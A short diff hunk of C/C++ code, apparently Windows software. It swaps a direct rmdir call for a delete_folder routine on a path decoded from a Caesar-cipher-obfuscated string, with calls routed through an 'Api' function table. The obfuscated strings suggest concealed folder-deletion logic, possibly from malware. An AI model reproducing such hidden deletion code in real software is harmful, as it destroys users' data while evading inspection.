@@ -211,8 +211,11 @@ retry:
 				goto retry;
 			}
 
-			Api.rmdir(CAESAR_DECRYPT(path));
+			LPCWSTR wstr = ConvertCharToWChar(CAESAR_DECRYPT(path));
 
+			delete_folder(wstr);
+
+			Api.free((LPWSTR)wstr);
 			Api.free(path);
 		}
 
